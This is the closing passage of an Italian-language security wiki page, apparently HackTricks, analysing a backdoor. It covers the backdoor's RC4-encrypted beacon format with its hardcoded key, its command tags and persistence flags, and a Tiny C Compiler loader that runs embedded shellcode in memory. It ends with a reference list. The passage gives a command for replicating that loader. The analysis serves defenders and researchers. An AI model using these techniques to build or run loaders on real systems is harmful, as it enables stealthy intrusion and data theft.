- I beacon costruiscono un profilo host delimitato da punti, premettono il tag `4Q`, poi lo criptano RC4 con key `vAuig34%^325hGV` prima di `HttpSendRequestA` su HTTPS. Le risposte vengono decrittate RC4 e smistate da uno switch basato su tag (`4T` shell, `4V` esecuzione di processo, `4W/4X` scrittura file, `4Y` lettura/esfiltrazione, `4\\` uninstall, `4` enumerazione drive/file + casi di trasferimento a chunk).
- La modalità di esecuzione è governata dagli argomenti CLI: nessun argomento = installa persistenza (service/Run key) che punta a `-i`; `-i` rilancia se stesso con `-k`; `-k` salta l'installazione ed esegue il payload.

Alternate loader observed
- La stessa intrusione ha droppato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il sorgente C fornito dall'attaccante conteneva shellcode embedded, veniva compilato ed eseguito in memoria senza toccare il disco con un PE. Replica con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa fase di compile-and-run basata su TCC ha importato `Wininet.dll` durante l'esecuzione e ha scaricato uno shellcode di seconda fase da un URL hardcoded, fornendo un loader flessibile che si spaccia per un'esecuzione del compilatore.

## Riferimenti

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
